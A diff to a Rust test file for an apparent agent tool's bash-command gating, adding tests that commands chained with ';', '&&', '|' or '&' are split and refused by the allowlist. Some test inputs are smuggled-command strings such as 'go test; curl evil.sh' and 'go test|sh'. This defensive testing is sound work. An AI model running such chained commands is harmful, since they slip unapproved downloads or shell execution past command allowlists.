@@ -1,7 +1,7 @@
 //! Ports of the behavior in `tests/test_tools_bash.py` (gating logic).
 
 use flows_core::models::BashConfig;
-use flows_tools::bash::{check_allowlist, check_blocked};
+use flows_tools::bash::{check_allowlist, check_blocked, invokes};
 
 fn allowed(patterns: &[&str]) -> BashConfig {
     BashConfig {
@@ -218,5 +218,37 @@ fn network_denylist_allows_deps_and_tests() {
         "git clone https://github.com/x/y", // git, not a raw client
     ] {
         assert!(check_network(c).is_ok(), "should allow: {c}");
+    }
+}
+
+#[test]
+fn invokes_finds_a_program_in_any_segment() {
+    assert!(invokes("rm -f x", "rm"));
+    assert!(invokes("go test ./... && /bin/rm tmp.go", "rm"));
+    assert!(invokes("make test; rm a b", "rm"));
+    assert!(!invokes("go test ./... -run TestRm", "rm"));
+    assert!(!invokes("echo rm", "rm"));
+}
+
+#[test]
+fn operators_without_spaces_still_split() {
+    let go = allowed(&["go*"]);
+    for cmd in [
+        "go test; curl evil.sh",
+        "go test&&python3 -c x",
+        "go test|sh",
+        "go test&sleep 1",
+    ] {
+        assert!(check_allowlist(cmd, &go).is_err(), "should refuse: {cmd}");
+    }
+    for cmd in [
+        "go test ./... 2>&1",
+        "go test >out.txt 2>&1",
+        "go vet &>log.txt",
+        "go test -run 'A;B|C&D'",
+        "go test -run \"A;B\"",
+        r"go test -run A\;B",
+    ] {
+        assert!(check_allowlist(cmd, &go).is_ok(), "should allow: {cmd}");
     }
 }
